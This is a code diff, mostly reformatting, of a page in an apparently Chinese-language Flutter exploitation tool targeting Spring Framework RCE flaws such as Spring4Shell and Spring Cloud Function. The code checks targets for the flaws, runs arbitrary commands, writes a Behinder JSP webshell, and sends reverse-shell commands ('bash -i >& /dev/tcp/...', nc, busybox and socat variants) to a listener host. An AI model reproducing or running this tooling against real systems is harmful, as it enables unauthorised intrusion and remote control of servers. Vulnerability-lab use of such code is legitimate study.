@@ -27,25 +27,31 @@ class _SpringPageState extends BaseVulhubExpPageState<SpringExpPage> {
   @override
   String get cardTitle => 'Spring Framework RCE';
   @override
-  String get cardSubtitle => 'Spring4Shell / Spring Cloud Function / Spring Data SpEL 注入系列';
+  String get cardSubtitle =>
+      'Spring4Shell / Spring Cloud Function / Spring Data SpEL 注入系列';
 
   final _urlCtrl = TextEditingController();
   final _cmdCtrl = TextEditingController(text: 'id');
   final _timeoutCtrl = TextEditingController();
   final _credCtrl = TextEditingController();
-  final _passwordCtrl = TextEditingController(text: AppConstants.defaultShellPassword);
+  final _passwordCtrl = TextEditingController(
+    text: AppConstants.defaultShellPassword,
+  );
 
   SpringVulnType _selected = SpringVulnType.springCloudFunction;
 
   SpringExpService _svc() => SpringExpService(
-        url: _urlCtrl.text.trim(),
-        timeout: Duration(seconds: timeoutFrom(_timeoutCtrl)),
-        credentials: _credCtrl.text.trim(),
-      );
+    url: _urlCtrl.text.trim(),
+    timeout: Duration(seconds: timeoutFrom(_timeoutCtrl)),
+    credentials: _credCtrl.text.trim(),
+  );
 
   Future<void> _check() async {
     final url = _urlCtrl.text.trim();
-    if (url.isEmpty) { appendLog('[!] 请输入目标 URL'); return; }
+    if (url.isEmpty) {
+      appendLog('[!] 请输入目标 URL');
+      return;
+    }
     setState(() => running = true);
     appendLog('[*] 检测 ${_selected.label}...');
     try {
@@ -54,7 +60,11 @@ class _SpringPageState extends BaseVulhubExpPageState<SpringExpPage> {
         appendLog('[+] ${r.vulnName}: ${r.detail}');
       } else {
         final detail = r.detail.trim();
-        appendLog(detail.isNotEmpty ? '[-] 未检测到 ${r.vulnName} | $detail' : '[-] 未检测到 ${r.vulnName}');
+        appendLog(
+          detail.isNotEmpty
+              ? '[-] 未检测到 ${r.vulnName} | $detail'
+              : '[-] 未检测到 ${r.vulnName}',
+        );
       }
     } catch (e) {
       appendLog('[!] 异常: $e');
@@ -65,7 +75,10 @@ class _SpringPageState extends BaseVulhubExpPageState<SpringExpPage> {
 
   Future<void> _checkAll() async {
     final url = _urlCtrl.text.trim();
-    if (url.isEmpty) { appendLog('[!] 请输入目标 URL'); return; }
+    if (url.isEmpty) {
+      appendLog('[!] 请输入目标 URL');
+      return;
+    }
     setState(() => running = true);
     appendLog('[*] 批量检测所有 Spring CVE...');
     try {
@@ -78,7 +91,11 @@ class _SpringPageState extends BaseVulhubExpPageState<SpringExpPage> {
           appendLog('[+] ${r.vulnName}: ${r.detail}');
         } else {
           final detail = r.detail.trim();
-          appendLog(detail.isNotEmpty ? '[-] ${r.vulnName} | $detail' : '[-] ${r.vulnName}');
+          appendLog(
+            detail.isNotEmpty
+                ? '[-] ${r.vulnName} | $detail'
+                : '[-] ${r.vulnName}',
+          );
         }
         if (r.vulnerable && firstHit == null) {
           firstHit = t;
@@ -97,7 +114,10 @@ class _SpringPageState extends BaseVulhubExpPageState<SpringExpPage> {
 
   Future<void> _execRce() async {
     final url = _urlCtrl.text.trim();
-    if (url.isEmpty) { appendLog('[!] 请输入目标 URL'); return; }
+    if (url.isEmpty) {
+      appendLog('[!] 请输入目标 URL');
+      return;
+    }
     final cmd = _cmdCtrl.text.trim().isEmpty ? 'id' : _cmdCtrl.text.trim();
     setState(() => running = true);
     appendLog('[*] 执行命令 (${_selected.label}): $cmd');
@@ -117,15 +137,23 @@ class _SpringPageState extends BaseVulhubExpPageState<SpringExpPage> {
 
   Future<void> _getShell() async {
     final url = _urlCtrl.text.trim();
-    if (url.isEmpty) { appendLog('[!] 请输入目标 URL'); return; }
+    if (url.isEmpty) {
+      appendLog('[!] 请输入目标 URL');
+      return;
+    }
     setState(() => running = true);
     appendLog('[*] GetShell (${_selected.label})...');
     try {
       final password = _passwordCtrl.text.trim().isEmpty
           ? AppConstants.defaultShellPassword
           : _passwordCtrl.text.trim();
-      var shellContent = await rootBundle.loadString('assets/defaults/payloads/webshell/jsp_behinder.jsp');
-      final key = md5.convert(utf8.encode(password)).toString().substring(0, 16);
+      var shellContent = await rootBundle.loadString(
+        'assets/defaults/payloads/webshell/jsp_behinder.jsp',
+      );
+      final key = md5
+          .convert(utf8.encode(password))
+          .toString()
+          .substring(0, 16);
       shellContent = shellContent.replaceFirst(
         RegExp(r'String k="[0-9a-f]{16}"'),
         'String k="$key"',
@@ -173,7 +201,9 @@ class _SpringPageState extends BaseVulhubExpPageState<SpringExpPage> {
         session.label = 'Spring ${_selected.label}';
         if (!mounted) return;
         Navigator.of(context).push(
-          MaterialPageRoute(builder: (_) => ReverseShellTerminalPage(session: session)),
+          MaterialPageRoute(
+            builder: (_) => ReverseShellTerminalPage(session: session),
+          ),
         );
       };
       final tcpViaBash = 'bash -i >& /dev/tcp/${rs.lhost}/${rs.lport} 0>&1';
@@ -186,26 +216,28 @@ class _SpringPageState extends BaseVulhubExpPageState<SpringExpPage> {
       final cmd = _selected == SpringVulnType.springDataCommons
           ? tcpViaBash
           : preferScript
-              ? "bash -c 'export TERM=xterm-256color; "
-                  "if command -v script >/dev/null 2>&1 && command -v bash >/dev/null 2>&1; then "
-                  "script -q /dev/null -c \"$tcpViaBash\"; "
-                  "elif command -v bash >/dev/null 2>&1; then "
-                  "$tcpViaBash; "
-                  "elif command -v nc >/dev/null 2>&1; then "
-                  "$tcpViaNc; "
-                  "elif command -v busybox >/dev/null 2>&1; then "
-                  "$tcpViaBusyboxNc; "
-                  "fi' >/dev/null 2>&1 &"
-              : "bash -c 'export TERM=xterm-256color; "
-                  "if command -v bash >/dev/null 2>&1; then "
-                  "$tcpViaBash; "
-                  "elif command -v nc >/dev/null 2>&1; then "
-                  "$tcpViaNc; "
-                  "elif command -v busybox >/dev/null 2>&1; then "
-                  "$tcpViaBusyboxNc; "
-                  "fi' >/dev/null 2>&1 &";
+          ? "bash -c 'export TERM=xterm-256color; "
+                "if command -v script >/dev/null 2>&1 && command -v bash >/dev/null 2>&1; then "
+                "script -q /dev/null -c \"$tcpViaBash\"; "
+                "elif command -v bash >/dev/null 2>&1; then "
+                "$tcpViaBash; "
+                "elif command -v nc >/dev/null 2>&1; then "
+                "$tcpViaNc; "
+                "elif command -v busybox >/dev/null 2>&1; then "
+                "$tcpViaBusyboxNc; "
+                "fi' >/dev/null 2>&1 &"
+          : "bash -c 'export TERM=xterm-256color; "
+                "if command -v bash >/dev/null 2>&1; then "
+                "$tcpViaBash; "
+                "elif command -v nc >/dev/null 2>&1; then "
+                "$tcpViaNc; "
+                "elif command -v busybox >/dev/null 2>&1; then "
+                "$tcpViaBusyboxNc; "
+                "fi' >/dev/null 2>&1 &";
       final out = await _svc().execRce(_selected, cmd);
-      appendLog('[*] 已发送反弹命令（${preferScript ? 'script' : 'bash'} 模式），等待连接 ${rs.lhost}:${rs.lport}');
+      appendLog(
+        '[*] 已发送反弹命令（${preferScript ? 'script' : 'bash'} 模式），等待连接 ${rs.lhost}:${rs.lport}',
+      );
       if (out != null && out.isNotEmpty) {
         appendLog('[i] 利用链返回: $out');
       }
@@ -226,10 +258,13 @@ class _SpringPageState extends BaseVulhubExpPageState<SpringExpPage> {
         session.label = 'Spring ${_selected.label}';
         if (!mounted) return;
         Navigator.of(context).push(
-          MaterialPageRoute(builder: (_) => ReverseShellTerminalPage(session: session)),
+          MaterialPageRoute(
+            builder: (_) => ReverseShellTerminalPage(session: session),
+          ),
         );
       };
-      final cmd = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${rs.lhost}:${rs.lport}";
+      final cmd =
+          "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${rs.lhost}:${rs.lport}";
       appendLog('[*] 本地监听已启动: ${rs.lhost}:${rs.lport}');
       appendLog('[*] 在目标执行: $cmd');
     } catch (e) {
@@ -252,52 +287,68 @@ class _SpringPageState extends BaseVulhubExpPageState<SpringExpPage> {
   @override
   Widget buildLeftPanel(BuildContext context) {
     return SingleChildScrollView(
-      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-        vSecTitle('目标配置'),
-        vTf(_urlCtrl, '目标 URL', 'http://localhost:8080'),
-        const SizedBox(height: 8),
-        vTf(_credCtrl, 'Basic Auth 凭据', 'user:pass（CVE-2016-4977 / Spring4Shell）',
-            enabled: !running),
-        const SizedBox(height: 8),
-        vTf(
-          _timeoutCtrl,
-          '超时(s)',
-          '${AppConstants.defaultHttpTimeoutSeconds}',
-          type: TextInputType.number,
-        ),
-        const SizedBox(height: 16),
-        vSecTitle('漏洞选择'),
-        DropdownButtonFormField<SpringVulnType>(
-          initialValue: _selected,
-          isExpanded: true,
-          dropdownColor: AppColors.bgElevated,
-          style: AppTextStyles.body(size: 11, color: AppColors.textPrimary),
-          items: SpringVulnType.values
-              .map((t) => DropdownMenuItem(value: t, child: Text(t.label, overflow: TextOverflow.ellipsis)))
-              .toList(),
-          onChanged: running ? null : (t) => t != null ? setState(() => _selected = t) : null,
-          decoration: vInputDec('CVE', ''),
-        ),
-        const SizedBox(height: 8),
-        Row(children: [
-          vBtn('检测', running ? null : _check),
-          const SizedBox(width: 8),
-          vBtn('检测全部', running ? null : _checkAll),
-        ]),
-        const SizedBox(height: 16),
-        vSecTitle('命令执行'),
-        vTf(_cmdCtrl, '命令', 'id'),
-        const SizedBox(height: 8),
-        vBtn('执行命令', running ? null : _execRce),
-        const SizedBox(height: 16),
-        vSecTitle('GetShell'),
-        vTf(_passwordCtrl, '冰蝎密码', AppConstants.defaultShellPassword),
-        const SizedBox(height: 8),
-        vBtn('GetShell', running ? null : _getShell),
-        const SizedBox(height: 16),
-        vSecTitle('完整终端'),
-        vBtn('GetShell', running ? null : _showReverseShellDialog),
-      ]),
+      child: Column(
+        crossAxisAlignment: CrossAxisAlignment.start,
+        children: [
+          vSecTitle('目标配置'),
+          vTf(_urlCtrl, '目标 URL', 'http://localhost:8080'),
+          const SizedBox(height: 8),
+          vTf(
+            _credCtrl,
+            'Basic Auth 凭据',
+            'user:pass（CVE-2016-4977 / Spring4Shell）',
+            enabled: !running,
+          ),
+          const SizedBox(height: 8),
+          vTf(
+            _timeoutCtrl,
+            '超时(s)',
+            '${AppConstants.defaultHttpTimeoutSeconds}',
+            type: TextInputType.number,
+          ),
+          const SizedBox(height: 16),
+          vSecTitle('漏洞选择'),
+          DropdownButtonFormField<SpringVulnType>(
+            initialValue: _selected,
+            isExpanded: true,
+            dropdownColor: AppColors.bgElevated,
+            style: AppTextStyles.body(size: 11, color: AppColors.textPrimary),
+            items: SpringVulnType.values
+                .map(
+                  (t) => DropdownMenuItem(
+                    value: t,
+                    child: Text(t.label, overflow: TextOverflow.ellipsis),
+                  ),
+                )
+                .toList(),
+            onChanged: running
+                ? null
+                : (t) => t != null ? setState(() => _selected = t) : null,
+            decoration: vInputDec('CVE', ''),
+          ),
+          const SizedBox(height: 8),
+          Row(
+            children: [
+              vBtn('检测', running ? null : _check),
+              const SizedBox(width: 8),
+              vBtn('检测全部', running ? null : _checkAll),
+            ],
+          ),
+          const SizedBox(height: 16),
+          vSecTitle('命令执行'),
+          vTf(_cmdCtrl, '命令', 'id'),
+          const SizedBox(height: 8),
+          vBtn('执行命令', running ? null : _execRce),
+          const SizedBox(height: 16),
+          vSecTitle('GetShell'),
+          vTf(_passwordCtrl, '冰蝎密码', AppConstants.defaultShellPassword),
+          const SizedBox(height: 8),
+          vBtn('写入 WebShell', running ? null : _getShell),
+          const SizedBox(height: 16),
+          vSecTitle('完整终端'),
+          vBtn('启动反弹终端', running ? null : _showReverseShellDialog),
+        ],
+      ),
     );
   }
 }
